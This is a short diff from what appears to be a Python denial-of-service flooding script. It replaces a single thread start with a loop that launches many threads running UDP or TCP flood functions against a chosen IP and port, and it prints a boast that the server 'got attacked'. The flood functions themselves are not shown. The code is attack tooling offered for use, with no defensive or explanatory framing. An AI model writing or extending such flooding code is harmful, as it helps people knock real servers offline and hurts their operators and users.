@@ -54,5 +54,11 @@ def run2():
     print('''Server Got Attacked By ImSon: {ip} | Port : {port} | Method : {choice}''')
 
 
-th = threading.Thread(target = run)
-th.start()
+for y in range(threads):
+    if choice == 'UDP':
+        th = threading.Thread(target = UDP)
+        th.start()
+    elif choice == 'TCP':
+        th = threading.Thread(target = tcp)
+        th.start()
+
